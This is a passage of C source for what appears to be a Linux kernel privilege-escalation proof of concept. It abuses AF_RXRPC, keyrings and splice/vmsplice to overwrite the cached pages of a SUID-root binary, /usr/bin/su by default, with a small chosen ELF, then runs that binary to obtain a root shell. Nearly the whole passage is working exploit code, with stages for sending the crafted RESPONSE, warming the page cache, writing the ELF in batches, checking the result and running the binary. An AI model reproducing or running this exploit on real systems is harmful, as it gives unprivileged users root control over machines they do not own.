			DIE("splice target[%d]: got %zd %s", i, s, strerror(errno));
	}

	/* Stage 3: HMAC zone + post-token (auth_len + auth body). */
	struct iovec iv2[2] = {
		{ .iov_base = hmac_zone, .iov_len = 12              },
		{ .iov_base = hdr_post,  .iov_len = sizeof(hdr_post) },
	};
	if (vmsplice(pfd[1], iv2, 2, 0) != (ssize_t)(12 + sizeof(hdr_post)))
		DIE("vmsplice tail: %s", strerror(errno));

	size_t total = sizeof(rmal) + sizeof(hdr_pre) +
		32 * nblocks + 12 + sizeof(hdr_post);
	ssize_t sn = splice(pfd[0], NULL, udp, NULL, total, 0);
	if (sn < 0) DIE("splice pipe→UDP: %s", strerror(errno));
	LOG("sent malicious RESPONSE %zd B (interleaved %d×32 + framing)",
	    sn, nblocks);

	close(pfd[0]); close(pfd[1]);
	usleep(200 * 1000);   /* let the kworker process the RESPONSE */
	close(udp); close(tfd);
}

/* ===================================================================
 * Main flow.
 * ===================================================================
 */
int main(int argc, char **argv)
{
	/* Default target: /usr/bin/su itself.  Mode 4755 SUID root and
	 * world-readable, so we can splice from its page-cache pages
	 * AND its eventual exec runs as root.  Override with argv[1]
	 * (any SUID-root, mode 0755 binary that you don't mind getting
	 * temporarily corrupted in cache; restored on next eviction). */
	const char *target = (argc > 1) ? argv[1] : "/usr/bin/su";
	int total_blocks      = 12;     /* drop full 192-byte ELF       */
	int blocks_per_batch  = 6;      /* MAX_SKB_FRAGS=17 → 6 pairs   */
	int nbatches = (total_blocks + blocks_per_batch - 1) / blocks_per_batch;

	/* Touch an AF_RXRPC socket first to trigger autoload of the
	 * rxrpc module via the net-pf-33 alias.  Without this, the
	 * subsequent add_key("rxrpc_s", ...) returns -ENODEV when the
	 * module isn't already loaded. */
	int probe = socket(AF_RXRPC, SOCK_DGRAM, AF_INET);
	if (probe >= 0) close(probe);

	/* Join an anonymous fresh session keyring, so add_key() doesn't
	 * collide with stale leftovers if this PoC is re-run. */
	if (syscall(SYS_keyctl, 1 /*KEYCTL_JOIN_SESSION_KEYRING*/, NULL) < 0)
		WARN("keyctl_join_session: %s", strerror(errno));

	/* Pick a random K and derive Ke = DK(K, RXGK_SERVER_ENC_TOKEN). */
	uint8_t K[KEY_LEN];
	int rfd = open("/dev/urandom", O_RDONLY);
	if (rfd < 0 || read(rfd, K, KEY_LEN) != KEY_LEN)
		DIE("urandom: %s", strerror(errno));
	close(rfd);
	compute_Ke(K, DERIVED_KE);

	/* Plumb the AF_RXRPC server side and prefill its accept pool. */
	setup_server_keyring(K);
	int srv = open_rxrpc_server();
	charge_accept_pool(srv, nbatches + 2);

	/* Pre-warm the target's page cache so the splice'd pages are
	 * already populated when the kernel's AEAD looks at them. */
	int prewarm = open(target, O_RDONLY);
	if (prewarm < 0) DIE("open %s: %s", target, strerror(errno));
	uint8_t buf[4096]; pread(prewarm, buf, 4096, 0); close(prewarm);
	LOG("pre-warmed page cache for %s", target);

	/* Drop the 192-byte ELF in nbatches RESPONSEs at consecutive
	 * 96-byte offsets. */
	for (int b = 0; b < nbatches; b++) {
		int start_block = b * blocks_per_batch;
		int batch_blocks = total_blocks - start_block;
		if (batch_blocks > blocks_per_batch)
			batch_blocks = blocks_per_batch;
		size_t batch_chosen_len = 16 * batch_blocks;
		off_t  batch_off        = 16 * start_block;
		LOG("=== batch %d/%d: %d blocks at offset %lld ===",
		    b + 1, nbatches, batch_blocks, (long long)batch_off);
		do_chosen_plaintext_attack(target,
					   TINY_ELF + batch_off,
					   batch_chosen_len,
					   batch_off);
	}

	/* Verify: read the cache via a fresh fd; the first 192 B should
	 * now be our chosen ELF. */
	size_t chosen_len = 16 * total_blocks;
	int vfd = open(target, O_RDONLY);
	uint8_t got[192]; pread(vfd, got, chosen_len, 0); close(vfd);
	int ok = memcmp(got, TINY_ELF, chosen_len) == 0;

	if (!ok) {
		LOG("cache content does not match expected ELF");
		LOG("got    : ");
		for (int i = 0; i < 32; i++) fprintf(stderr, "%02x ", got[i]);
		fputc('\n', stderr);
		LOG("expect : ");
		for (int i = 0; i < 32; i++) fprintf(stderr, "%02x ", TINY_ELF[i]);
		fputc('\n', stderr);
		close(srv);
		return 1;
	}

	LOG("✓ %s first %zu bytes are now our chosen plaintext", target, chosen_len);
	LOG("exec %s — should give a root shell", target);
	close(srv);
	execl(target, target, (char *)NULL);
	WARN("exec %s failed: %s", target, strerror(errno));
	return 1;
}
